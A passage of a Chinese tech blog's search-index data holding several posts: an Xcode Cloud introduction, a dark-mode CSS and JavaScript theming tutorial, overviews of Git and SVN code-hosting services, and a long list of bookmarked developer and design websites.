","date":"2021-11-25","objectID":"/zh-cn/25/:0:0","tags":["费曼","技术","学习"],"title":"使用费曼技术更快地学习任何东西","uri":"/zh-cn/25/"},{"categories":["Xcode"],"content":"Xcode Cloud 简介 Xcode Cloud 是专为 Apple 开发者设计的 Xcode 内置持续集成和交付服务。它将多款基于云的工具整合在一起，帮助您构建 app，并行运行多个自动化测试，向测试员交付 app，以及查看和管理用户反馈，从而让您可以更快地开发和交付高质量的 app。 ","date":"2021-11-24","objectID":"/zh-cn/24/:0:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"注册获取 Beta 版 为提供更优质的体验，beta 版一开始仅面向部分开发者提供，随后将会逐步扩大提供范围。要获取 beta 版，请提交请求，我们会在您的帐户可以启用相关功能时给您发送电子邮件。 注册 (英文) 进一步了解 ","date":"2021-11-24","objectID":"/zh-cn/24/:1:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"轻松设置 只需几分钟，即可在 Xcode Cloud 中完成设置并开始构建大部分 app，构建版本状态会显示在 Xcode 中，构建完成后，结果报告也会立即出现在 Xcode 中。Xcode Cloud 利用您 Xcode 项目中的信息来优化构建版本设置。 ","date":"2021-11-24","objectID":"/zh-cn/24/:2:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"在云端构建 Xcode Cloud 工作流程可以在云端自动构建您的 app，无需专门的构建基础架构。 ","date":"2021-11-24","objectID":"/zh-cn/24/:3:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"自动化工作流程 您可以根据自己的开发流程来配置工作流程，也可以使用内置工作流程作为入手点，再随着流程发展进行自定。您可以为每一次的代码更改生成相应的构建版本，如果更改引发了任何问题，您的整个团队会立即收到提醒，而不必等到错误被最终用户发现，减少了可能被浪费的时间。 ","date":"2021-11-24","objectID":"/zh-cn/24/:4:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"并行测试 您可以根据不同的测试需求对 Xcode Cloud 进行配置，可以测试一两种设备来快速检查项目状况，也可以针对边缘情况以较低频率大范围测试设备配置。Xcode Cloud 会并行分配资源，让您和 Mac 都能一边继续编写代码，一边快速完成测试工作。 ","date":"2021-11-24","objectID":"/zh-cn/24/:5:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"Xcode 整合 构建版本与测试的结果，甚至用户针对崩溃提供的反馈，都会直接呈现在 Xcode 中。在云端进行构建时，Xcode 会显示实时状态指示器，并允许您根据想要监控的构建任务进行筛选。 ","date":"2021-11-24","objectID":"/zh-cn/24/:6:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"与 TestFlight 配合使用 ","date":"2021-11-24","objectID":"/zh-cn/24/:7:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"即刻部署给测试员 对于最多 100 人的内部质量保障团队，Xcode Cloud可与 TestFlight 配合使用，即刻将新的成功构建版本安装至相关团队，让每个人都能立即开始进行测试。 ","date":"2021-11-24","objectID":"/zh-cn/24/:7:1","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"自定测试员群组 TestFlight 可与 Xcode Cloud 配合使用，定义外部测试员群组 (最多 10,000 人，可以通过公开链接或电子邮件邀请完成注册)。您可以将具有独特开发中功能的特定 app 分支发送给选定测试员，也可以在您尝试新的创意时进行对照测试。 ","date":"2021-11-24","objectID":"/zh-cn/24/:7:2","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"App Store Connect 仪表盘 网页版 App Store Connect 可以显示有关 Xcode Cloud 构建版本和测试结果的重要信息，并可显示测试员提供的截屏反馈。 ","date":"2021-11-24","objectID":"/zh-cn/24/:8:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["Xcode"],"content":"安全与隐私 Xcode Cloud 可为您的项目和隐私提供周全保护，所有数据都会加密存储，访问过程也通过双重认证加以保护。只有构建版本的源代码可供访问，而且临时构建环境会在构建完成时予以销毁。 Xcode 查找关于如何使用 Xcode Cloud 的详细信息和分步说明。 [阅读文档 (英文)] (https://developer.apple.com/documentation/Xcode/Xcode-Cloud) App Store Connect 查找关于使用 App Store Connect 中 Xcode Cloud 仪表盘的详细信息。 [阅读文档] (https://help.apple.com/app-store-connect/?lang=zh-cn#/) 主题演讲视频 了解 Apple 在 WWDC 及其他活动中最新公布的技术。 [观看视频 (部份配有简体中文字幕)] (https://developer.apple.com/videos/developer-tools/) 论坛 向 Apple 工程师和开发者同行提问并讨论开发主题。 [查看论坛 (英文)] (https://developer.apple.com/forums/tags/xcode) ","date":"2021-11-24","objectID":"/zh-cn/24/:9:0","tags":["Xcode"],"title":"Xcode Cloud 简介","uri":"/zh-cn/24/"},{"categories":["HTML","JS","Web","网页"],"content":"此文为加密收费内容添加我微信支付后可看: 網頁黑暗模式 Dark Mode 設計技巧 網頁黑暗模式 dark mode 的出發點是讓晚上夜貓子的使用者不會受到螢幕強烈的白光照射瞳孔，對於需要大量閱讀文字的服務如 blog 新聞類的網頁，利用黑底白字強調內容並增加訊噪比，是一個希望在黑暗環境中增進使用者體驗的做法，另外發的光少，也有節約電力的好處。本文介紹目前自己研究 dark mode 的心得以及設計技巧。 ","date":"2021-11-23","objectID":"/zh-cn/23/:0:0","tags":["HTML","JS","Web","网页"],"title":"網頁黑暗模式 Dark Mode 設計技巧","uri":"/zh-cn/23/"},{"categories":["HTML","JS","Web","网页"],"content":"dark mode 顏色色盤設計注意事項 # dark mode 顧名思義就是要黑底白字，但其實你如果直接用純黑底色 #000 純白文字 #fff，對比太強烈反而對於眼睛閱讀更不舒服，這個世界的顏色並非都是非黑即白的。因此設計時可以透過深灰來代替純黑，淺灰代替純白，閱讀上看起來會比較柔和。 而其他網頁元件顏色的選用，因為佔整個網頁的面積不像是文字那麼多，要記得要把明度拉高一點才不會被黑暗背景色吃掉變得不明顯。 ","date":"2021-11-23","objectID":"/zh-cn/23/:1:0","tags":["HTML","JS","Web","网页"],"title":"網頁黑暗模式 Dark Mode 設計技巧","uri":"/zh-cn/23/"},{"categories":["HTML","JS","Web","网页"],"content":"用 css variable 實現 dark mode # css variable 是一個把 css 裡面用到的 value 都抽象成變數並放在 class 裡面，並透過抽換覆寫 body 或 html 最上層裡頭的 class 來決定 css variable 的內容，這個技巧使得網頁容易做到有色彩主題的功能，使用方式如下： body { --bgColor: #fff; --fontColor: #424242; background: var(--bgColor);}p { color: var(--fontColor);} 另外也還需要使用一個新的 media query prefers-color-scheme，是一個用來作為偵測系統目前是不是處於 dark mode 下的 media query，如果偵測裝置目前需要呈現 dark mode 我們就可以把 css variable 抽換成黑暗系色碼如下： @media (prefers-color-scheme: dark) { body { --bgColor: #212121; --fontColor: #bdbdbd; }} 這樣就完成了 dark mode 的功能，然而 css variable 目前美中不足的地方就是不支援 IE，如果你的服務必須要支援 IE，你可能就要在 dark 模式底下覆寫掉其他 class 的色碼。 ","date":"2021-11-23","objectID":"/zh-cn/23/:2:0","tags":["HTML","JS","Web","网页"],"title":"網頁黑暗模式 Dark Mode 設計技巧","uri":"/zh-cn/23/"},{"categories":["HTML","JS","Web","网页"],"content":"黑暗模式中的圖片處理 # 去背圖片在黑暗模式中因為背景變成黑底色，可能就會造成深色內容被深色背景吃掉的問題，為了避免這個問題，建議 img 的背景一律調成跟正常模式的背景色 @media (prefers-color-scheme: dark) { img { background: #fff; }} 即使處理好文字以及背景的色系讓其在黑暗模式不過於刺眼，依舊會遇到另一個問題就是萬惡白底圖，大圖片的白底在 dark mode 裡面就像是被使用太陽拳(暴露年齡)一樣的刺眼，而每上一次圖都要去調整圖片的亮度做切換這樣十分的麻煩，還好 css 有提供一個屬性 filter 讓我們可以調整亮度這件事情 @media (prefers-color-scheme: dark) { img, video, iframe { filter: brightness(0.9); }} 這樣就可以盡量減少白底圖的刺眼，提供更舒適的閱讀體驗 ","date":"2021-11-23","objectID":"/zh-cn/23/:3:0","tags":["HTML","JS","Web","网页"],"title":"網頁黑暗模式 Dark Mode 設計技巧","uri":"/zh-cn/23/"},{"categories":["HTML","JS","Web","网页"],"content":"黑暗模式手動切換 # 但不是每一個使用者都希望照著裝置的喜好來看網頁，根據環境光線的不同，使用者可能需要手動做黑暗模式的主題切換，這時候我們必須利用 JavaScript 幫忙做一個切換的 switcher 按鈕，讓使用者自己可以開燈關燈，並儲存使用者的喜好進到 localStorage，讓他下次進來也可以保持一致的主題。 把原本 prefers-color-scheme 的 style 都改到 .dark 的下面 偵測並使用使用者上次喜好的主題，若無則使用裝置預設的喜好主題 把切換按鈕綁定 click 事件，點擊則做主題切換，並儲存主題喜好進到 localStorage 其中第二步從其他 blog 參考過來的作法如下： \u003cscript\u003e var preferredTheme; try { preferredTheme = localStorage.getItem(\"theme\"); } catch (err) {} function setTheme(newTheme) { if (newTheme !== document.body.className) { window.__theme = newTheme; preferredTheme = newTheme; document.body.className = newTheme; } } window.__setPreferredTheme = function (newTheme) { try { if (newTheme !== preferredTheme) { localStorage.setItem(\"theme\", newTheme); } } catch (err) {} setTheme(newTheme); }; var darkQuery = window.matchMedia(\"(prefers-color-scheme: dark)\"); darkQuery.addListener(function (e) { window.__setPreferredTheme(e.matches ? \"dark\" : \"light\"); }); setTheme(preferredTheme || (darkQuery.matches ? \"dark\" : \"light\"));\u003c/script\u003e 剩下就把 window.__setPreferredTheme 綁定到切換按鈕下就完成了。 注意這段 script 建議 inline 插在 \u003cbody\u003e 下面，利用 sync script 會 block rendering process 的特性，在畫面渲染前設定好正確的 class ，避免渲染兩次會顏色忽白忽黑的跳動問題，如果你是在類似 React.useEffect瀏覽器渲染之後才設定 theme 就容易導致顏色跳動問題。 ","date":"2021-11-23","objectID":"/zh-cn/23/:4:0","tags":["HTML","JS","Web","网页"],"title":"網頁黑暗模式 Dark Mode 設計技巧","uri":"/zh-cn/23/"},{"categories":["HTML","JS","Web","网页"],"content":"心得 # 也許黑暗模式 dark mode 可能照顧了使用者在光線不足下的閱讀體驗，但並不是每一個服務都適合 dark mode，像我覺得電商類的服務就沒有那麼適合，黑黑的看的購物慾都沒了，也有許多網站做了 dark mode 也沒有提供使用者手動做切換的功能，有時候我用 dark mode 只是想要我的系統列在 mac 上有個黑框而已，而被逼的我逛每一個網站都黑黑的。 黑暗模式真的顧眼睛嗎？我是抱持著存疑的態度。另外畢竟不是所有的網站都有實作 dark mode，用 dark mode 瀏覽網頁導致瞳孔放大，不小心切換到沒有實作的網站，放大的瞳孔又瞬間被太陽拳重擊一發，說不定更不舒服啊。晚上還是早點睡，別看螢幕才是最好的做法啊。 ","date":"2021-11-23","objectID":"/zh-cn/23/:5:0","tags":["HTML","JS","Web","网页"],"title":"網頁黑暗模式 Dark Mode 設計技巧","uri":"/zh-cn/23/"},{"categories":["代码","托管","平台"],"content":"此文为加密收费内容添加我微信支付后可看: 整理：国内外热门代码托管平台一览 电子信息化的高速发展产生了越来越多的程序员。对于程序员来说，写代码是每日工作的主要内容，因此打造一个好的代码环境是改善程序员工作体验的重要环节。然而实际项目中众多的参与人员、繁复的代码版本都为代码管理带来不少麻烦。因此代码托管服务成为程序员协同工作的重要帮手。 为了方便程序员们更好地选择需要的代码托管平台，在这里我们就国内外热门代码托管平台进行了统一整理。全球最流行的代码托管平台：GitHubGitHub是全球最流行的面向开源及私有软件项目的托管平台，有超过2600万的用户群体。随着越来越多的应用程序转移到了云上，GitHub已经成为了管理软件开发以及发现已有代码的首选方法。GitHub可以托管各种git库，并提供一个web界面，与其它代码托管平台不同的是GitHub的“分支”结构可以很容易地将某个项目的成功经验应用到另外与一个项目中。此外，GitHub还提供了针对企业私有云服务的GitHub企业版。开源中国旗下的代码托管平台：码云码云是开源中国社区团队推出的基于Git的快速的、免费的、稳定的在线代码托管平台。专为开发者提供的云端软件开发协作平台。无论是个人、团队、或是企业，都能够用码云实现代码托管、项目管理、协作开发。基于git的仓库管理程序：GitLabGitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的Git项目仓库，可通过Web界面进行访问公开的或者私人项目安装。 拥有与GitHub类似的功能，能够浏览源代码，管理缺陷和注释。可以管理团队对仓库的访问，它非常易于浏览提交过的版本并提供一个文件历史库。 团队成员可以利用内置的简单聊天程序（Wall）进行交流。它还提供一个代码片段收集功能可以轻松实现代码复用，便于日后有需要的时候进行查找。灵活强大的代码托管平台：BitBucketBitBucket是一家源代码托管网站，采用Mercurial和Git作为分布式版本控制系统，同时提供商业计划和免费账户。提供免费帐户，带有不限数量的私人存储库（每个账户最多 5 个用户），也提供多种付费计划，允许每个帐户有更多用户。此外，标记为“公开”的仓库对可以编辑或读取其内容的人数没有限制。支持社交元素的代码托管平台：CODING - 一站式软件研发管理平台Coding.net是一个面向开发者的云端开发平台，提供 git/svn 代码托管，代码质量分析，在线 WebIDE，项目管理，开发协作，冒泡社区，提供个人和企业公有云及企业私有云的服务。项目管理是针对软件开发协作定制的一站式工具，包含了任务，讨论，文件等功能。支持多成员协作，并且深度集成了代码仓库的操作与状态。此外，还提供社会化协作功能，包含了社交元素，方便开发者进行技术讨论和协作。项目管理分为公开和私有项目，单个账号可以创建总共1000个项目，包括公开和私有项目，支持移动客户端。老牌流行代码托管平台：SourceforgeSourceforge是开源软件开发者进行开发管理的集中式场所，是全球最大开源软件开发平台和仓库。网站建立的宗旨，就是为开源软件提供一个存储、协作和发布的平台。SourceForge上拥有大量非常优秀的开源软件。其它相关同类型软件：全栈软件项目管理工具unfuddle.com支持Git，Mercurial和Subversion的项目管理工具codebasehq.com公共的Git托管站点repo.or.cz软件协作平台并支持代码托管launchpad.net简洁Trac、Git、SVN和Hg托管repositoryhosting.com专为Mozilla应用程序和扩展提供免费项目托管mozdev.org 国外的有GithubGitlab国内的有码云腾讯开发者平台阿里 Code 自己本地进行搭建推荐GogsGitlab 使用线上平台的，国外推荐 Github，国内推荐码云（gitee），都是免费托管，允许私有项目本地搭的情况，Gitlab 功能全但也笨重，很多功能都是不怎么需要的，轻量需求推荐 Gogs Github Gitlab Sourceforge 这些老生常谈了。 今天讲一个不一样的： Azure DevOps 不知道是不是因为在Microsoft工作的原因，反正贼好用。Maybe Gitlab enterprise is good too, but I’ll never find out. 云效代码管理Codeup是一款企业级代码管理平台，提供代码托管、代码评审、代码扫描、质量检测等功能，保护企业代码资产，实现安全、稳定、高效的研发生产。 点击卡片了解： 云效代码管理 Codeup_代码托管_企业级代码管理平台-阿里云www.aliyun.com/product/yunxiao/codeup?channel=yy_rccb 流行的平台已经差不多都提到了，我说几个比较冷门的。 Launchpadlaunchpad.net/ 如果你是开源项目特别是 Ubuntu 社区的积极贡献者可以考虑这里。缺点是设计风格比较古老。 Visual Studio IDE、代码编辑器、Azure DevOps 和 App Center - Visual Studiovisualstudio.microsoft.com/zh-hans/ 微软死忠可以考虑，对小项目免费。由于微软混乱的命名风格，我不太清楚 Azure DevOps、Visual Studio Online 这几个品牌是否指的是同一个东西。现在它也支持用 Github 账号登陆。 另外，Amazon AWS、Google Cloud 和 Microsoft Azure 等大的云服务平台也都支持代码托管，有免费试用期，到期以后费用也很便宜。它们的主要优点是和自家的服务集成起来比较方便，但毕竟不是主打产品，和 Github/Gitlab 比起来功能肯定是要弱一些的。 1、华为开源平台(2019.8.31正式上线) 华为开源平台 https://code.opensource.huaweicloud.com/ 建议中国大陆开发者慢慢从github转移到大陆自己的开源平台。 2、码云（国内比较大的代码托管平台，开源中国旗下） http://gitee.com 码云 Gitee — 基于 Git 的代码托管和研发协作平台 3、阿里云Code托管平台 https://code.aliyun.com/ 官方网站：阿里云登录 - 欢迎登录阿里云，安全稳定的云计算服务平台 4、百度效率云 http://xiaolvyun.baidu.com/ 百度效率云 | Git代码托管，版本管理，项目管理，持续集成，持续交付，研发工具云端解决方案 5、coding 以及 coding也腾讯合作腾讯开发者平台 CODING 代码托管 | 极速 Git 代码仓库服务 https://coding.net/ 腾讯云开发者平台 | 技术助力开发 https://dev.tencent.com/ 6、github Build software better, together 2018年被Microsoft以75亿美元收购，已与政治挂钩，已限制了许多受美国制裁的国家的开发者账户，未来不排除对中国的开发者限制的可能性。 7、gitlab https://github.com The first single application for the entire DevOps lifecycle - GitLab 8、bitbucket (位桶) https://bitbucket.org/product/ Bitbucket | The Git solution for professional teams 9、Google Code https://code.google.com/ 很可惜，大陆访问不了。 10、推荐3个开源平台（与上述代码托管平台不同,但也公开/下载源代码） https://www.codeproject.com/ https://sourceforge.net/ https://www.csdn.net/ ","date":"2021-11-22","objectID":"/zh-cn/22/:0:0","tags":["代码","托管","平台"],"title":"托管平台","uri":"/zh-cn/22/"},{"categories":["代码","托管","平台"],"content":"SVN 在线代码托管工具 在互联网环境使用SVN服务，你必须要有一台在互联网环境内支持SVN服务的在线服务器（Online Server） 您可能习惯了在公司的内网使用SVN，但如果您经常于游走于各种不同的办公环境，比如公司、家里、客户处，用着很多台不同的电脑，那么您将需要一台互联网环境的SVN服务器。 下面介绍几款SVN在线代码托管工具 RiouxSVN （私有、免费、国外） 特点：RiouxSVN is free, and always will be. ​ 1、支持私有仓库。（ 默认私有仓库，公开需手动，这也是跟 google code、github、sourceforge 相比最大的亮点） ​ 2、团队协作开发。（不限用户人数） ​ 3、每日备份数据。（随时下载 .svndump 备份文件） ​ 4、界面简洁美观。（而且没有任何形式广告） ​ 5、捐赠项目积分。（这个得要子弹了，花钱升级更大空间） 缺点：每个仓库只有50MB，不过对于一般项目还是够了，本站20MB左右，大部分都是 hibernate、spring 第三方 jar 包，真正自己写的核心代码没多少。另外跟 github 比没有中文界面，这个也不能算是缺点，翻译下也能搞定。 注意：如果是私有仓库，使用过程中输入的用户名、密码就是注册 RiouxSVN 网站时的用户名、密码，不会像 google code 那样提供单独密码。 SVNSpot （私有、免费、国内） 免费用户 10M试用空间，可创建私人项目 ，最多只能创建2个版本库 VIP用户　500M空间/100元一年　创建5个版本库 每项目10位成员 1000M空间/200元一年　创建10个版本库 每项目10位成员 2000M空间/400元一年 创建10个版本库 每项目10位成员 SVN Hosting （私有、收费、国内） 免费用户 1）如果你是新建一个开源项目的SVN，是免费的，而且空间、数量不限； 2）如果你要加入其它人创建的项目，是免费的。 3）如果你需要新建私人项目（受帐号密码保护的），磁盘空间限制50M，试用期7天。超时或者超过磁盘配额，项目空间变为只读，不能提交代码，但是可以获取代码。 我们会通过电子邮件提示您（可能进入垃圾邮件箱，请注意查收）。 VIP 用户 1）免费项目可以转成付费项目。 2）源码管理项目个数、类型不受限制，合计磁盘空间占用不超过1G。 3）收费标准：每个账户98元/年。帐号到期后，项目文件仍然可以获取，但是不能提交修改。即变为只读的。三个月没有续费以后将删除项目，以减少空间浪费 SVNChina （私有、收费、国内） 特点： 1）如果你是项目开发组成员（或项目代码只读者），只需要加入别人的项目，是免费的，而且加入的项目数量、空间不限； 2）如果你是项目作者（主持人），需要建立自己的项目（不管是私人项目还是开源项目），我们将向你收取年费（目前有￥99/年-￥699/年等多种空间标准），交纳年费后，在使用期内可享有本站全部功能，并且新建的项目数量不限；你在付费前，将有一个月的免费试用期。 3）如果你不再为你的帐户续费，我们将为你把你所创建的项目最多保留15天，在该时间内，你只能读取你的代码，不能写入；在15天后，如果你仍没有进行续费，我们将把你创建的项目删除。 细则： 任何新注册会员，从他注册日起将有一个月的免费试用时间； 超过了使用期后，该会员所创建的所有“项目”将变成不可写，但仍可读（即可以checkout, update, export，但不可以import, commit），包括创建者本人以及项目成员； 如果创建者超过15天仍然没有续费，将视为放弃使用权，服务器将自动删除其下所有创建的项目，并回收空间。 在注册会员到期前1个月及7天系统将自动发送邮件提醒用户续费。 新注册的会员超过1个月不激活将自动回收用户名，并删除用户。 所有不创建新项目的会员，不需要续费，也不需要理会其帐户过期的提醒，不影响其正常使用。 sourceforge （开源、免费、国外） 全球最大开源软件开发平台和仓库，支持 Git、 Mercurial、Subversion Google Code （开源、免费、国外） google 开源代码托管，支持 Git、 Mercurial、Subversion，可在线浏览 GitHub （开源、免费、国外） 当前最红火的代码托管服务，仅支持Git，可在线浏览， 也提供私有项目，但收费，$7.00/month OSChina （开源、免费、国内） 国内新兴的IT门户网站，支持代码片段，可在线浏览 CSDN （开源、免费、国内） 不多说了，下载需要积分，但它的积分系统太垃圾了 别人下载了我的代码，返还给我的积分还不到总量的10%！！！ big bug is pig bug ","date":"2021-11-22","objectID":"/zh-cn/22/:1:0","tags":["代码","托管","平台"],"title":"托管平台","uri":"/zh-cn/22/"},{"categories":[],"content":"此文为加密收费内容添加我微信支付后可看: 网站 一位大佬的收藏夹(opens new window) 码力全开资源库 (opens new window)很全很强大，独立开发者/设计干货/优质利器/工具资源… ","date":"2021-11-22","objectID":"/zh-cn/ybc/:0:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#文档 MDN (opens new window)| MDN-JS标准内置对象 (opens new window)Web技术权威文档 现代JavaScript教程 (opens new window)以最新标准为基准的JS教程 ES5教程 (opens new window)阮一峰的JS教程 ES6教程 (opens new window)阮一峰的ES6教程 Bash 脚本教程 (opens new window)阮一峰编写 ECMA (opens new window)ECMA官网 菜鸟教程 (opens new window)涵盖多种语言的初级教程 腾讯云开发者手册(opens new window) ","date":"2021-11-22","objectID":"/zh-cn/ybc/:1:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#社区 Github (opens new window)程序员同性交友社区 掘金 (opens new window)一个帮助开发者成长的社区 简书 (opens new window)有很多频道的创作社区 思否 (opens new window)解决技术问题的社区 stack overflow (opens new window)同上，外网的 InfoQ(opens new window) V2EX(opens new window) 鱼塘热榜 (opens new window)划水网站，收集了很多网站，当天热门文章 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:2:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#博客 阮一峰的网络日志(opens new window) css-tricks (opens new window)css技巧文章 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:3:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#文章 灵活运用CSS开发技巧(opens new window) ","date":"2021-11-22","objectID":"/zh-cn/ybc/:4:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#视频 慕课网 (opens new window)实战视频教程 妙味课堂 (opens new window)比较系统的前端入门视频教程 中国大学MOOC (opens new window)涵盖计算机、外语、心理学等专业免费课程 bilibili (opens new window)B站，上面也有一些可供学习的免费视频 egghead (opens new window)质量还不错的短视频教程，外网 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:5:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#电视直播 CCTV、卫视高清直播(opens new window) ","date":"2021-11-22","objectID":"/zh-cn/ybc/:5:1","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#Github github 短域名服务(opens new window) shields (opens new window)徽章图标 followers 全球排名(opens new window) star-history (opens new window)展示一个项目 Stars 增长曲线 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:6:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#在线工具 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#开发 Can I use (opens new window)查看属性和方法的兼容性 30 seconds of code (opens new window)收集了许多有用的代码小片段 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:1","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#代码编辑 codepen (opens new window)在线代码编辑与演示 codesandbox (opens new window)内嵌VSCode的在线IDE ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:2","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#UI iconfont (opens new window)阿里巴巴矢量图标库 undraw (opens new window)免费的矢量插画 icomoon (opens new window)矢量图标库 cssicon (opens new window)所有的 icon 都是纯 css 画的 缺点：icon 不够多 CSS triangle generator (opens new window)帮你快速用 css 做出三角形 clippy (opens new window)在线帮你使用 css clip-path 做出各种形状的图形 Lorem Picsum (opens new window)提供免费的占位图 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:3","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#Emoji表情 emoji表情(opens new window) emoji表情备忘录(opens new window) gitmoji (opens new window)通过 emoji 表达 git 的操作内容 windows系统下按Win+.快速打开表情选择框 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:4","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#图片压缩 tinypng图片压缩 (opens new window)压缩png很有用 Squoosh (opens new window)谷歌出品在线免费图片压缩工具 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:5","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#作图 processon在线作图 (opens new window)流程图、思维导图、原型图等 百度脑图 (opens new window)思维导图 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:6","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#CSS CSS Tricks (opens new window)CSS技巧收集与演示 CSS生成器(opens new window) CSS渐变生成器(opens new window) CSS3-Box Shadow(阴影)(opens new window) 贝塞尔曲线生成器 (opens new window) 花纹背景生成器(opens new window) 花纹背景css(opens new window) ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:7","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#CDN加速 jsDelivr (opens new window)国外的一家优秀的公共 CDN 服务提供商 unpkg (opens new window)cdn 服务 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:8","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#正则 正则可视化(opens new window) ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:9","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#其他 Linux命令手册(opens new window) 代码图片生成器(opens new window) ","date":"2021-11-22","objectID":"/zh-cn/ybc/:7:10","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#设计 创造师导航(opens new window) 设计师网址导航(opens new window) uimovement (opens new window)能从这个网站找到不少动画交互的灵感 awwwards (opens new window)是一个一个专门为设计精美的网站以及富有创意的网站颁奖的网站 dribbble (opens new window)经常能在上面找到很多有创意好看的 gif 或者图片 Bēhance (opens new window)dribbble 是设计师的微博，Bēhance 是设计师的博客 Logojoy (opens new window)使用 ai 做 logo 的网站，做出来的 logo 质量还不错。 brandmark (opens new window)另一个在线制作 logo 网站 instant (opens new window)又一个 logo 制作网站 logo-maker (opens new window)又一个 logo 制作网站 这个更简单点 就是选模板之后微调 coolors (opens new window)帮你在线配色的网站 你能找到不少配色灵感 colorhunt (opens new window)另一个配色网站 uigradients (opens new window)渐变色网站 designcap (opens new window)在线海报设计 Flat UI 色表 (opens new window)Flat UI 色表 0to255 (opens new window)颜色梯度 Ikonate (opens new window)提供免费的图标 icons remixicon (opens new window)又一个提供免费图标 icons feather (opens new window)免费的 icons nord (opens new window)北欧性冷淡风主题配色 Unsplash (opens new window)提供免费的高清图片 colorkitty (opens new window)从你的图片中提取配色 design.youzan (opens new window)有赞设计原则 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:8:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#图库 uigradients (opens new window)渐变色生成工具 freepik (opens new window)banner 图库 觅元素 (opens new window)一天免费下载十张 psd 搞定设计 (opens new window)可以抠图 vectorizer (opens new window)真正的 png 转 svg 神器 站酷(opens new window) 花瓣(opens new window) 虎克 (opens new window)Ps 学习教程 beTheme(opens new window) UI 中国(opens new window) ","date":"2021-11-22","objectID":"/zh-cn/ybc/:8:1","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#有趣 奇趣网站收藏家 (opens new window)收藏了很多有趣的网站 帮你百度一下 (opens new window)可以 点我测试一下 (opens new window)- 国际版 (opens new window)同帮我百度一下-点我测试一下 (opens new window)- wallhaven (opens new window)壁纸网站- URL 地址播放 Emojis 动画 (opens new window)在地址栏里面播放 emoji Can’t Unsee (opens new window)强烈建议前端、客户端、UI 开发的同学玩下，检查一下自己对设计稿的敏感度怎么样 ggtalk (opens new window)平时一直在听的一个技术博客 awesome-comment (opens new window)里面收集了很多有趣的代码注释 text-img (opens new window)都将图片转化为 ascii 用来写注释 weird-fonts (opens new window)将普通字母转化为 特殊 unicode snake (opens new window)在地址栏里面玩贪吃蛇 zero-width-lib (opens new window)利用零宽度字符实现 隐形水印、加密信息分享、逃脱词匹配，很有创意 abbreviations (opens new window)查看一个简写是什么意思的网站 magi (opens new window)ai 搜索神器，超屌 诺基亚短信图片生成器(opens new window) ","date":"2021-11-22","objectID":"/zh-cn/ybc/:9:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#交互 微交互 (opens new window)里面收集了市面上很多很好的微交互例子 值得学习 Little Big Details (opens new window)同上，一个国外微交互汇集网站 cruip (opens new window)登录页的各种页面设计，可以免费下载模板 Comixify (opens new window)一个波兰团队做了非常好玩的工具，可以把视频自动转成漫画，上图是他们提供的 demo，效果很棒。 taiko-web (opens new window)太鼓达人网页版 只能说很 6 